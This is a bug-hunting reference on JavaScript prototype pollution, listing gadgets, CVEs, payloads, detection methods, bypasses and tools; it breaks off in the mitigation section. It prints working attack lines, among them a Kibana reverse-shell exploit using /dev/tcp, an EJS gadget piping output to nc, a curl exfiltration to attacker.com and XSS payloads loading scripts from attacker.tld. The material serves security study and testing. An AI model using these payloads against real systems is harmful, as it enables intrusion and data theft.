# Prototype Pollution - Comprehensive Bug Hunting Reference

> **Version**: 1.0 | **Date**: 2026-05-23  
> **Scope**: Client-Side Prototype Pollution (CSPP), Server-Side Prototype Pollution (SSPP), Gadgets, Payloads, Detection, Exploitation, Mitigation  
> **Sources**: PortSwigger Web Security Academy, PayloadsAllTheThings, BlackFan/client-side-prototype-pollution, KTH-LangSec/server-side-prototype-pollution, HoLyVieR/NorthSec18, yeswehack/pp-finder, fastify/secure-json-parse, arXiv research papers, and more.

---

## Table of Contents

1. [What is Prototype Pollution?](#1-what-is-prototype-pollution)
2. [Core Concepts](#2-core-concepts)
3. [Sources of Prototype Pollution](#3-sources-of-prototype-pollution)
4. [Sinks](#4-sinks)
5. [Client-Side Gadgets](#5-client-side-gadgets)
6. [Server-Side Gadgets](#6-server-side-gadgets)
7. [NPM Package Gadgets](#7-npm-package-gadgets)
8. [Known Exploits & CVEs](#8-known-exploits--cves)
9. [Payloads](#9-payloads)
10. [Detection Techniques](#10-detection-techniques)
11. [Bypass Techniques](#11-bypass-techniques)
12. [Tools](#12-tools)
13. [Mitigation & Prevention](#13-mitigation--prevention)
14. [Research Papers](#14-research-papers)
15. [References](#15-references)

---

## 1. What is Prototype Pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities.

- **Client-side**: Commonly leads to **DOM XSS**
- **Server-side**: Can result in **Remote Code Execution (RCE)**, privilege escalation, SSRF, path traversal, and more.

### JavaScript Prototypes and Inheritance

In JavaScript, prototypes allow objects to inherit features from other objects. Almost all objects inherit from `Object.prototype`.

```javascript
let myObjectLiteral = {};
let myObject = new Object();

// Accessing prototype
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
myObjectLiteral.constructor.prototype  // Object.prototype
myObject.__proto__                     // Object.prototype
myObject["__proto__"]                 // Object.prototype
```

### Successful Exploitation Requires

1. **A prototype pollution source** — Any input that enables you to poison prototype objects with arbitrary properties.
2. **A sink** — A JavaScript function or DOM element that enables arbitrary code execution or dangerous behavior.
3. **An exploitable gadget** — Any property that is passed into a sink without proper filtering or sanitization.

---

## 2. Core Concepts

### How Vulnerabilities Arise

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself.

Example vulnerable merge:
```javascript
// Attacker input: { "__proto__": { "evilProperty": "payload" } }
// The merge operation may execute:
targetObject.__proto__.evilProperty = 'payload';
```

### Pollution Persistence

- **Browser**: Refreshing the page resets the environment.
- **Server-side (Node.js)**: Once you pollute a server-side prototype, this change persists for the entire lifetime of the Node process. There is no way to reset it without restarting the server.

---

## 3. Sources of Prototype Pollution

### 3.1 URL Query/Fragment String

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
https://vulnerable-website.com/?__proto__.evilProperty=payload
https://vulnerable-website.com/#__proto__[xxx]=alert(1)
```

When breaking the query string down into key:value pairs, a URL parser may interpret `__proto__` as an arbitrary string. However, during recursive merge operations, the JavaScript engine treats `__proto__` as a getter for the prototype.

### 3.2 JSON-Based Input

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

`JSON.parse()` treats any key in the JSON object as an arbitrary string, including `__proto__`. The resulting object will have a property with the key `__proto__` (unlike object literals where `hasOwnProperty('__proto__')` returns `false`).

```javascript
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

### 3.3 Web Messages

```javascript
// Malicious web message
window.postMessage('{"__proto__":{"evilProperty":"payload"}}', '*');
```

### 3.4 Constructor Property (Bypass)

Every JavaScript object has a `constructor` property, which contains a reference to the constructor function. Each constructor function has a `prototype` property:

```javascript
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

This provides an alternative vector when `__proto__` is filtered:

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

---

## 4. Sinks

### Client-Side Sinks (DOM XSS)

Common sinks that can lead to DOM XSS when combined with prototype pollution:

- `innerHTML`
- `eval()`
- `document.write()`
- `script.src`
- `location.href`
- `window.open()`
- `setTimeout()` / `setInterval()`
- `Function()` constructor

### Server-Side Sinks (Node.js)

- `child_process.exec()` / `execSync()` / `execFile()` / `execFileSync()`
- `child_process.spawn()` / `spawnSync()` / `fork()`
- `require()`
- `eval()`
- Template engines (EJS, Pug, Handlebars, etc.)
- `fetch()` / `http.request()` / `https.request()`
- `fs` module functions
- `Worker` constructor

---

## 5. Client-Side Gadgets

> Source: BlackFan/client-side-prototype-pollution

A gadget is a property that is:
1. Used by the application in an unsafe way (passed to a sink without filtering)
2. Attacker-controllable via prototype pollution (the object inherits the malicious version)

### jQuery Gadgets

| Library | Payload | Impact | Researcher |
|---------|---------|--------|------------|
| jQuery $.get | `?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x` | XSS | Sergey Bobrov |
| jQuery $.get >= 3.0.0 | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script` | XSS | Michał Bentkowski |
| jQuery $.get >= 3.0.0 | `?__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=` | XSS | Sergey Bobrov |
| jQuery $.getScript >= 3.4.0 | `?__proto__[src][]=data:,alert(1)//` | XSS | s1r1us |
| jQuery $.getScript 3.0.0-3.3.1 | `?__proto__[url]=data:,alert(1)//` | XSS | s1r1us |
| jQuery $(html) | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dalert(1)>` | XSS | Sergey Bobrov |
| jQuery $(x).off | `?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>` | XSS | Sergey Bobrov |
| jQuery $(x).attr | `?__proto__[OnError]=alert(1)&__proto__[SRC]=fakeimagewontload.jpg` | XSS | Johan Carlsson |
| jQuery $(x).on, $(x).submit | `?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror%3Dalert(1)>&__proto__[focus]=x&__proto__[needsContext]=x` | XSS | Johan Carlsson |

### Library-Specific Gadgets

| Library | Payload | Impact | Researcher |
|---------|---------|--------|------------|
| Google reCAPTCHA | `?__proto__[srcdoc][]=<script>alert(1)</script>` | XSS | s1r1us |
| Twitter Universal Website Tag | `?__proto__[hif][]=javascript:alert(1)` | XSS | Sergey Bobrov |
| Tealium Universal Tag | `?__proto__[attrs][src]=1&__proto__[src]=data:,alert(1)//` | XSS | Sergey Bobrov |
| Akamai Boomerang | `?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js` | XSS | s1r1us |
| Lodash <= 4.17.15 | `?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)` | XSS | Alex Brasetvik |
| sanitize-html | `?__proto__[*][]=onload` | Bypass | Michał Bentkowski |
| sanitize-html | `?__proto__[innerText]=<script>alert(1)</script>` | Bypass | Hpdoger |
| js-xss | `?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src` | Bypass | Michał Bentkowski |
| DOMPurify <= 2.0.12 | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` | Bypass | Michał Bentkowski |
| DOMPurify <= 2.0.12 | `?__proto__[documentMode]=9` | Bypass | Michał Bentkowski |
| Google Closure | `?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1` | Bypass | Michał Bentkowski |
| Google Closure | `?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//` | XSS | Michał Bentkowski |
| Marionette.js / Backbone.js | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)` | XSS | Sergey Bobrov |
| Adobe Dynamic Tag Management | `?__proto__[src]=data:,alert(1)//` | XSS | Sergey Bobrov |
| Swiftype Site Search | `?__proto__[xxx]=alert(1)` | XSS | s1r1us |
| Embedly Cards | `?__proto__[onload]=alert(1)` | XSS | Guilherme Keerok |
| Segment Analytics.js | `?__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dalert(1)>` | XSS | Sergey Bobrov |
| Knockout.js | `?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,` | XSS | Michał Bentkowski |
| Zepto.js | `?__proto__[onerror]=alert(1)` | XSS | lih3iu |
| Zepto.js | `?__proto__[html]=<img/src/onerror%3dalert(1)>` | XSS | Sergey Bobrov |
| Sprint.js | `?__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>` | XSS | lih3iu |
| Vue.js | `?__proto__[v-if]=_c.constructor('alert(1)')()` | XSS | POSIX |
| Vue.js | `?__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script` | XSS | s1r1us |
| Vue.js | `?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()` | XSS | r00timentary |
| Vue.js | `?__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>` | XSS | SuperGuesser |
| Vue.js | `?__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"` | XSS | st98_ |
| Vue.js | `?__proto__[template]=<script>alert(1)</script>` | XSS | huli |
| Google Analytics | `?__proto__[cookieName]=COOKIE%3DInjection%3B` | Cookie Injection | Sergey Bobrov |
| Popper.js | `?__proto__[arrow][style]=color:red;transition:all%201s&__proto__[arrow][ontransitionend]=alert(1)` | XSS | Matheus Vrech |
| Pendo Agent | `?__proto__[dataHost]=attacker.tld/js.js%23` | XSS | Renwa |
| hCaptcha | `?__proto__[assethost]=javascript:alert(1)//` | XSS | Masato Kinugawa |
| Google Tag Manager | `?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>` | XSS | terjanq |
| Google Tag Manager | `?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7` | XSS | Sergey Bobrov / Masato Kinugawa |
| Wistia Embedded Video | `?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>` | XSS | William Bowling |
| i18next | `?__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%3dalert(1)>` | Potential XSS | Sergey Bobrov |
| Demandbase Tag | `?__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?` | XSS | SPQR |
| @analytics/google-tag-manager | `?__proto__[customScriptSrc]=//attacker.tld/xss.js` | XSS | SPQR |

---

## 6. Server-Side Gadgets

> Source: KTH-LangSec/server-side-prototype-pollution, PortSwigger Research

### Node.js Core API Gadgets

| Function | Polluted Properties | Type | Notes |
|----------|-------------------|------|-------|
| `child_process.exec` | `NODE_OPTIONS` | ACI (Arbitrary Code Injection) | Partially fixed; connect via shell.js |
| `child_process.execFile` | `NODE_OPTIONS` | ACI | Partially fixed |
| `child_process.execFileSync` | `shell`; `NODE_OPTIONS` | ACI | Partially fixed |
| `child_process.execFileSync` | `shell`; `input` | ACI | Windows only |
| `child_process.execSync` | `NODE_OPTIONS` | ACI | Partially fixed |
| `child_process.execSync` | `shell`; `env` | ACI | Fixed; Linux only |
| `child_process.execSync` | `shell`; `input` | ACI | Windows only |
| `child_process.fork` | `NODE_OPTIONS` | ACI | Partially fixed |
| `child_process.spawn` | `shell`; `env` | ACI | Partially fixed |
| `child_process.spawn` | `shell`; `input` | ACI | Windows only |
| `child_process.spawnSync` | `shell`; `NODE_OPTIONS` | ACI | Partially fixed |
| `child_process.spawnSync` | `shell`; `env` | ACI | Linux only |
| `child_process.spawnSync` | `shell`; `input` | ACI | Windows only |
| `fetch` | `method`; `body`; `referrer` | Privilege Escalation | |
| `fetch` | `socketPath` | SSRF | |
| `http.get` | `hostname`, `headers`, `method`, `path`, `port` | SSRF | |
| `http.request` | `hostname`, `headers`, `method`, `path`, `port` | SSRF | |
| `http.Server.listen` | `backlog` | Segfault | |
| `https.get` | `hostname`, `headers`, `method`, `path`, `port`, `NODE_TLS_REJECT_UNAUTHORIZED` | SSRF | |
| `https.request` | `hostname`, `headers`, `method`, `path`, `port`, `NODE_TLS_REJECT_UNAUTHORIZED` | SSRF | |
| `import` | `source` | ACE | |
| `tls.connect` | `path`, `port`, `NODE_TLS_REJECT_UNAUTHORIZED` | Second-order SSRF | |
| `require` | `main`; `NODE_OPTIONS` | ACI | Fixed; requires absence of `main` in package.json |
| `require` | `main`; `NODE_OPTIONS` | ACI | Fixed in v18.19.0 |
| `Worker.constructor` | `argv`, `env`, `eval` | Second-order ACE / Env injection | |

### RCE via child_process.fork()

The `fork()` method accepts an options object with `execArgv` property — an array of command-line arguments. If left undefined, it can be controlled via prototype pollution:

```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('id')"
        ]
    }
}
```

### RCE via child_process.execSync()

Pollute both `shell` and `input` properties:

```json
{
    "__proto__": {
        "shell": "vim",
        "input": ":! curl attacker.com/$(id | base64)\n"
    }
}
```

Alternative using `NODE_OPTIONS`:

```json
{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect=YOUR-COLLABORATOR-ID.oastify.com"".oastify"".com"
    }
}
```

### Status Code Override (Detection Gadget)

```json
{
    "__proto__": {
        "status": 510
    }
}
```

Use an obscure status code in the 400-599 range. Node's `http-errors` module reads `err.status` or `err.statusCode` from the error object.

### JSON Spaces Override (Detection Gadget)

```json
{
    "__proto__": {
        "json spaces": "    "
    }
}
```

If successful, JSON responses will have increased indentation.

### Charset Override (Detection Gadget)

Using UTF-7 encoding to detect pollution:

```json
{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "+AGYAbwBv-",
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}
```

If polluted, the UTF-7 string `+AGYAbwBv-` decodes to `foo` in the response.

### CORS Header Gadget

```json
{
    "__proto__": {
        "exposedHeaders": ["foo"]
    }
}
```

Server returns `Access-Control-Expose-Headers` header.

### Express Parameter Limit DoS

```json
{
    "__proto__": {
        "parameterLimit": 1
    }
}
```

Send 2+ parameters in GET request; at least 1 must be reflected.

### Express Query Prefix Bypass

```json
{
    "__proto__": {
        "ignoreQueryPrefix": true
    }
}
```

Use `??foo=bar` in query string.

### Express Allow Dots

```json
{
    "__proto__": {
        "allowDots": true
    }
}
```

Use `?foo.bar=baz` in query string.

---

## 7. NPM Package Gadgets

> Source: KTH-LangSec/server-side-prototype-pollution (Dasty, Silent Spring, UoPF research)

### Arbitrary Code Injection (ACI) / ACE Gadgets

| Package | Version | Function | Polluted Properties | Type |
|---------|---------|----------|-------------------|------|
| asyncawait | 3.0.0 | require | `shell`; `NODE_OPTIONS` | ACI |
| better-queue | 3.8.12 | push | `store` | LFI* |
| binary-parser | 2.2.1 | parse | `alias` | ACE |
| bson | 4.7.2 | deserialize | `evalFunctions` | ACE |
| chrome-launcher | 0.15.2 | launch | `shell`; `NODE_OPTIONS` | ACI |
| coffee | 5.5.0 | fork | `env` | ACI |
| coffee | 5.5.0 | spawn | `shell`; `env` | ACI |
| cross-port-killer | 1.4.0 | kill | `shell`; `env` | ACI |
| cross-spawn | 7.0.3 | spawn | `shell`; `NODE_OPTIONS` | ACI |
| cross-spawn | 7.0.3 | spawn.sync | `shell`; `NODE_OPTIONS` | ACI |
| csv-write-stream | 2.0.0 | end | `separator` | ACE |
| dockerfile_lint | 0.3.4 | DockerFileValidator | `arrays.regex` | ACE |
| download-git-repo | 3.0.2 | download-git-repo | `clone`; `GIT_SSH_COMMAND` | ACI |
| ejs | 3.1.9 | render | `client`; `escapeFunction` | ACE |
| exec | 0.2.1 | exec | `shell` | ACI |
| external-editor | 3.1.0 | edit | `shell`; `NODE_OPTIONS` | ACI |
| external-editor | 3.1.0 | editAsync | `shell`; `NODE_OPTIONS` | ACI |
| fibers | 5.0.3 | require | `shell`; `NODE_OPTIONS` | ACI |
| find-process | 1.4.7 | find-process | `shell`; `NODE_OPTIONS` | ACI* |
| forever-monitor | 3.0.3 | start | `command` | ACI |
| gh-pages | 5.0.0 | publish | `shell`; `NODE_OPTIONS` | ACI |
| gift | 0.10.2 | clone | `shell`; `NODE_OPTIONS` | ACI |
| git-clone | 0.2.0 | git-clone | `GIT_SSH_COMMAND` | ACI |
| gm | 1.25.0 | gm | `appPath` | ACI |
| growl | 1.10.5 | growl | `exec` | ACI |
| jsdoc-api | 8.0.0 | explain | `NODE_OPTIONS` | ACI |
| jsdoc-api | 8.0.0 | explainSync | `env.NODE_OPTIONS` | ACI |
| jsdoc-api | 8.0.0 | renderSync | `NODE_OPTIONS` | ACI |
| jsdoc-to-markdown | 8.0.0 | render | `NODE_OPTIONS`; `source` | ACI |
| jsdoc-to-markdown | 8.0.0 | renderSync | `NODE_OPTIONS`; `source` | ACI |
| liftoff | 4.0.0 | prepare | `env.NODE_OPTIONS` | ACI |
| lodash.template | 4.5.0 | lodash.template | `sourceURL` | ACE |
| mrm-core | 7.1.14 | install | `shell`; `env.NODE_OPTIONS` | ACI |
| nodemailer | 6.9.1 | sendMail | `sendmail`; `path`; `args` | ACI |
| ping | 0.4.4 | sys.probe | `shell` | ACI |
| play-sound | 1.1.5 | play-sound | `players` | ACI |
| play-sound | 1.1.5 | play | `player`; `env.NODE_OPTIONS` | ACI |
| python-shell | 5.0.0 | runString | `pythonPath`; `NODE_OPTIONS` | ACI |
| requireg | 0.2.2 | resolve | `shell`; `env.NODE_OPTIONS` | ACI |
| sonarqube-scanner | 3.0.1 | sonarqube-scanner | `version` | ACI |
| teen_process | 2.0.4 | start | `shell`; `env.NODE_OPTIONS` | ACI |
| the-script-jsdoc | 2.0.4 | the-script-jsdoc | `shell`; `env.NODE_OPTIONS` | ACI |
| tingodb | 0.6.1 | findOne | `_sub` | ACE |
| window-size | 1.1.1 | tput | `shell`; `NODE_OPTIONS` | ACI |
| winreg | 1.2.4 | values | `shell`; `NODE_OPTIONS` | ACI |
| workerpool | 6.4.0 | exec | `env.NODE_OPTIONS` | ACI |

### Template Engine Gadgets (ACE/XSS)

| Package | Version | Function | Polluted Properties | Type |
|---------|---------|----------|-------------------|------|
| node-blade | 3.3.1 | compile | `code`, `value` | ACE |
| node-blade | 3.3.1 | compile | `line`, `value` | ACE |
| node-blade | 3.3.1 | compile | `include`, `exposing`, `value` | ACE |
| node-blade | 3.3.1 | compile | `output`, `value` | ACE |
| node-blade | 3.3.1 | compile | `itemAlias`, `value` | ACE |
| node-blade | 3.3.1 | compile | `templateNamespace`, `value` | ACE |
| ejs | 2.7.4 | renderFile | `escape`, `client` | ACE |
| ejs | 2.7.4 | renderFile | `destructuredLocals` | ACE |
| squirrellyJS | 8.0.8 | renderFile | `settings` | ACE |
| squirrellyJS | 8.0.8 | renderFile | `settings`, `n` | ACE |
| dustjs | 3.0.1 | render | `title` | XSS |
| ect | 0.5.9 | ECT | `indent` | ACE |
| ect (coffee-script) | 1.12.7 | ECT | `filename`, `inlineMap` | ACE |
| doT | 1.1.3 | process | `global` | ACE |
| doT | 1.1.3 | process | `destination` | FileIO |
| pug | 3.0.2 | compile | `code` | ACE |
| pug | 3.0.2 | compile | `attrs`, `val` | ACE |
| jade | 1.11.0 | renderFile | `code`, `self` | ACE |
| jade | 1.11.0 | renderFile | `block`, `self` | ACE |
| hamlet | 0.3.3 | hamlet | `filename` | ACE |
| hamlet | 0.3.3 | hamlet | `variable` | ACE |
| mote | 0.2.0 | compile | `ANYKEY*` | ACE |
| ractive.js | 1.4.2 | toHTML | `statics` | ACE |
| saker | 1.1.1 | compile | `$saker_raw$`, `str` | XSS |
| handlebars | 4.5.2 | `ret` | `type`; `body` | ACE |
| pug | all versions | `Template` | `block` | ACE |

> *LFI* = Local File Inclusion; *ACE* = Arbitrary Code Execution; *ACI* = Arbitrary Command Injection; *XSS* = Cross-Site Scripting

---

## 8. Known Exploits & CVEs

> Source: KTH-LangSec/server-side-prototype-pollution

| CVE / Report | Application | Version | Attack | Gadget |
|--------------|-------------|---------|--------|--------|
| CVE-2019-7609 | Kibana | 6.6.0 | RCE | child_process.spawn.lnx |
| HackerOne #852613 | Kibana | 7.6.2 | RCE | lodash.template |
| HackerOne #861744 | Kibana | 7.7.0 | RCE | lodash.template |
| Silent Spring Report | npm cli | 8.1.0 | RCE | child_process.spawn |
| CVE-2022-24760 | Parse Server | 4.10.6 | RCE | bson |
| CVE-2022-39396 | Parse Server | 5.3.1 | RCE | bson |
| CVE-2022-41878 | Parse Server | 5.3.1 | RCE | bson |
| CVE-2022-41879 | Parse Server | 5.3.1 | RCE | bson |
| Silent Spring Report | Parse Server | 5.3.1 | RCE | require #1 |
| CVE-2023-23917 | Rocket.Chat | 5.1.5 | RCE | bson |
| CVE-2023-31414 | Kibana | 8.7.0 | RCE | require #2 |
| CVE-2023-31415 | Kibana | 8.7.0 | RCE | nodemailer |
| CVE-2023-36475 | Parse Server | 6.2.1 | RCE | bson |

### Notable Exploit Details

**Kibana RCE (CVE-2019-7609)**:
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

**EJS RCE Gadget**:
```json
{
    "__proto__": {
        "client": 1,
        "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
    }
}
```

---

## 9. Payloads

### 9.1 Basic Prototype Pollution Payloads

```javascript
// Direct prototype access
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"

// JSON payloads
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}

// URL-encoded payloads
?__proto__[test]=test
?__proto__.test=test

// Array-style notation
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
```

### 9.2 URL-Based Payloads (Found in the Wild)

```
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

### 9.3 Asynchronous / Node.js RCE Payloads

```json
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=payload"".oastify"".com"
  }
}
```

### 9.4 Constructor Bypass Payloads

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

### 9.5 Filter Bypass Payloads

If `__proto__` is stripped but not recursively:

```
?__pro__proto__to__.gadget=payload
```

After single-pass stripping of `__proto__`:
```
?__proto__.gadget=payload
```

### 9.6 Server-Side Detection Payloads

**Property Reflection**:
```json
{
    "user": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener",
    "__proto__": {
        "foo": "bar"
    }
}
```

**Status Code Override**:
```json
{
    "__proto__": {
        "status": 510
    }
}
```

**JSON Spaces**:
```json
{
    "__proto__": {
        "json spaces": "    "
    }
}
```

**Charset Override (UTF-7)**:
```json
{
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}
```

**CORS Header**:
```json
{
    "__proto__": {
        "exposedHeaders": ["foo"]
    }
}
```

**Express Parameter Limit**:
```json
{
    "__proto__": {
        "parameterLimit": 1
    }
}
```

---

## 10. Detection Techniques

### 10.1 Client-Side Detection

**Manual Testing**:
1. Try to inject an arbitrary property via query string, URL fragment, and JSON input:
   ```
   vulnerable-website.com/?__proto__[foo]=bar
   ```
2. Inspect `Object.prototype` in browser console:
   ```javascript
   Object.prototype.foo
   // "bar" = success
   // undefined = failed
   ```
3. Try alternative notations:
   ```
   ?__proto__.foo=bar
   ?constructor[prototype][foo]=bar
   ```

**Using DOM Invader** (Burp Suite):
- DOM Invader automatically tests for prototype pollution sources as you browse.
- Can automatically scan for gadgets and generate DOM XSS PoC.

**Gadget Detection via Debugger**:
```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

### 10.2 Server-Side Detection

**Non-Destructive Techniques** (PortSwigger Research):

1. **Polluted Property Reflection** — Inject `__proto__` with a test property into JSON bodies. If the property appears in the response, the prototype is polluted.

2. **Status Code Override** — Pollute `status` property and trigger an error. Check if the HTTP status changes to your injected value (must be 400-599).

3. **JSON Spaces Override** — Pollute `json spaces` and observe indentation changes in JSON responses.

4. **Charset Override** — Pollute `content-type` with `charset=utf-7` and check if UTF-7 encoded strings are decoded in responses.

5. **CORS Header Check** — Pollute `exposedHeaders` and check for `Access-Control-Expose-Headers`.

6. **Async Detection** — Pollute `shell` and `NODE_OPTIONS` with `--inspect` flag to trigger DNS/interaction with Burp Collaborator when a new Node process spawns.

**Using Burp Suite Extension**:
- Install **Server-Side Prototype Pollution Scanner** from BApp Store.
- Scanning modes: Body scan, Param scan, Async body scan, Full scan, etc.

### 10.3 Black-Box Detection Without DoS

Key principles from PortSwigger research:
- Use properties that are **undefined by default** in frameworks (Express, body-parser, etc.)
- Choose **non-destructive** properties that produce visible but reversible changes
- Avoid polluting common properties that will break the application

---

## 11. Bypass Techniques

### 11.1 Constructor Bypass

When `__proto__` is filtered, use the `constructor` property chain:

```json
{"constructor": {"prototype": {"gadget": "payload"}}}
```

### 11.2 Double-Stripping Bypass

If sanitization strips `__proto__` only once:

```
Input:  __pro__proto__to__
After 1 strip: __proto__
```

### 11.3 Node.js --disable-proto Bypass

Node applications can use `--disable-proto=delete` or `--disable-proto=throw`, but this can be bypassed using the `constructor` technique.

### 11.4 JSON.parse vs Object Literal

`JSON.parse()` creates objects where `__proto__` is an **own property** (not inherited), making it more dangerous during merges:

```javascript
const obj = JSON.parse('{"__proto__": {"evil": true}}');
obj.hasOwnProperty('__proto__'); // true
```

---

## 12. Tools

### Discovery & Exploitation

| Tool | Author | Purpose |
|------|--------|---------|
| **pp-finder** | yeswehack | Find prototype pollution gadgets in JavaScript code via AST instrumentation |
| **ppmap** | dwisiswant0 | Client-side prototype pollution scanner |
| **ppfuzz** | GeekyCat | Prototype pollution fuzzer |
| **PPScan** | msrkp (kleiton0x00) | Client-side prototype pollution scanner |
| **suspect-prototype-pollution** | d0nutptr | Detection tool |
| **ppscan** | kleiton0x00 | Scanner |
| **Server-Side Prototype Pollution Scanner** | PortSwigger | Burp Suite extension for SSPP detection |
| **param-miner** | PortSwigger | Can help find parameters that accept JSON |
| **DOM Invader** | PortSwigger | Built into Burp's browser; auto-detects CSPP sources and gadgets |
| **pp-debugger** | GoogleChromeLabs | Debugging tool for prototype pollution |
| **cariddi** | edoardottt | Web scanner that can detect prototype pollution |
| **katana** | projectdiscovery | Web crawler for mapping attack surface |
| **httpx** | projectdiscovery | Fast HTTP prober |
| **nuclei-templates** | projectdiscovery | Has prototype pollution exposure templates |
| **subfinder** | projectdiscovery | Subdomain discovery |
| **interactsh** | projectdiscovery | Out-of-band interaction server (for async detection) |
| **notify** | projectdiscovery | Notification framework |
| **uncover** | projectdiscovery | Search engine API wrapper |

### Gadget Research Repositories

| Repository | Author | Content |
|------------|--------|---------|
| **client-side-prototype-pollution** | BlackFan | Client-side gadgets for popular libraries |
| **server-side-prototype-pollution** | KTH-LangSec / yuske | Server-side gadgets in Node.js, Deno, NPM |
| **prototype-pollution-nsec18** | HoLyVieR | NorthSec 2018 talk materials |
| **prototype-pollution-exploits** | lirantal | Collection of exploits |
| **prototype-pollution-payloads** | renniepak | Payload collection |
| **PrototypePollutionPayloads** | 0dayCTF | Payload collection |
| **prototype-pollution-payload** | jellydn | Payloads |
| **prototype-pollution-payloads** | shiipou | Payloads |
| **prototype-pollution-payloads** | dark-warlord14 | Payloads |
| **prototype-pollution-payloads** | OliverKew | Payloads |
| **prototype-pollution-study-notes** | aszx87410 | Study notes |
| **denim-proto-pollution** | denimgroup | Research |
| **blackhat-usa-2023-prototype-pollution** | NozomiNetworks | BlackHat USA 2023 materials |
| **artsploit/prototype-pollution-nsec18** | artsploit | NorthSec materials |
| **nodejs-goof** | snyk-labs | Vulnerable app for learning |

### Secure Parsing

| Tool | Purpose |
|------|---------|
| **secure-json-parse** | JSON.parse() drop-in replacement with prototype poisoning protection |
| **smuggler** | HTTP request smuggling detection (can chain with PP) |

---

## 13. Mitigation & Prevention

### 13.1 Sanitizing Property Keys

**Allowlist** (most effective):
Only permit known-safe keys.

**Blocklist** (stopgap only):
Remove dangerous strings like `__proto__`, `constructor`, `prototype`.

> ⚠️ Weak blocklists can be bypassed via double-stripping or constructor chains.

### 13.2 Freezing Prototypes

Prevent any modifications to prototype objects:

```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(String.prototype);
```

`Object.seal()` is similar but allows changing existing property values.

### 13.3 Null Prototypes

Create objects that don't inherit from `Object.prototype`:

```javascript
let myObject = Object.create(null);
